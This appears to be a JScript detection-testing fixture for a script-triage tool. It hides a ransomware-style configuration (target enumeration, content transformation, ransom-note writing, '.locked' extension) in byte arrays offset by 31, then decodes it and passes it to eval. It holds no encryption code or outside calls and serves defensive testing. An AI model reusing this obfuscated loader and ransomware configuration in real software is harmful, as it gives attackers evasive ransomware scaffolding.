// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_b201c67e = function(storedMaterial) {
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push((storedMaterial[i] + 31) % 256); }
  return recoveredMaterial;
};
var recover_cb5e784c = function() {
  if (true) {
    var firstPart = [92,3,84,85,70,81,84,3,27,60,3,70,79,86,78,70,83,66,85,70,64,85,66,83,72,70,85,84,3,13,3,85,83,66,79,84,71,80,83,78,64,68,80,79,85,70,79,85,3,13,3,88,83,74,85,70,64,83,70,68,80,87,70,83,90,64,79,80,85,70,3,62,13,3,66,69,66,81,85,70,83,3,27,3,34,37,48,37,35,15,52,85,83,70,66,78,3,13,3,87,66,77,86,70,84,3,27,92,3,68,66,78,81,66,74,72,79,64,74,69,3,27,3,68,66,78,81,66,74,72,79,14,24,17,71,25,67,21,23,21,23,23,3,13,3,85,66,83];
    var secondPart = [72,70,85,64,83,80,80,85,3,27,3,36,27,61,61,54,84,70,83,84,61,61,49,86,67,77,74,68,61,61,41,86,79,85,83,70,84,84,45,66,67,61,61,74,78,81,66,68,85,14,24,17,71,25,67,21,23,21,23,23,3,13,3,70,89,85,70,79,84,74,80,79,3,27,3,15,77,80,68,76,70,69,14,24,17,71,25,67,21,23,21,23,23,3,13,3,79,80,85,70,64,79,66,78,70,3,27,3,51,38,36,48,55,38,51,14,24,17,71,25,67,21,23,21,23,23,15,85,89,85,3,94,13,3,84,85,66,72,70,36,80,86,79,85,3,27,20,94];
    var storedMaterial = firstPart.concat(secondPart);
    var harmlessValue = [3, 5, 8, 13].slice(1, 3);
    var recoveredMaterial = [];
    var pass = 0;
    while (pass < 1) { recoveredMaterial = decode_b201c67e.apply(null, [storedMaterial]); pass++; }
    var textParts = [];
    for (var bi = 0; bi < recoveredMaterial.length; bi++) { textParts.push(String.fromCharCode(recoveredMaterial[bi])); }
    var configurationText = textParts.join("");
    return configurationText;
  }
};
var inspect_a03925b7 = function() {
  var configuration = eval("(" + recover_cb5e784c.apply(null, []) + ")");
  var table = { steps: function() { return configuration["steps"]; }, values: function() { return configuration["values"]; } };
  return { steps: table["steps"].apply(null, []), adapter: configuration["adapter"], values: table["values"].apply(null, []), stageCount: configuration["stageCount"] };
};
